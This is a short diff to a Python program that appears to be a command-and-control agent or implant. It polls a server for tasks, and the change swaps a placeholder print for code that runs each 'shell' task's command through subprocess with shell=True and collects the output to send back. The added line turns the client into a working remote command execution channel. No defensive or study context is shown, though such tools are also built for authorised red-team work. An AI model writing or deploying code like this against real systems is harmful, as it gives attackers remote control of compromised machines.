@@ -2,6 +2,7 @@ import base64
 import json
 import random
 import requests
+import subprocess
 import sys
 import time
 
@@ -66,7 +67,7 @@ def main():
                         check_in_task_id = id
                         continue
                     if name == 'shell':
-                        print('whoooooooooo')
+                        results = subprocess.check_output(parameters[0], stderr=subprocess.STDOUT, shell=True, encoding='UTF-8')
                     if not results:
                         batch_response.extend([{
                             "connectrpc": "0.0.0",
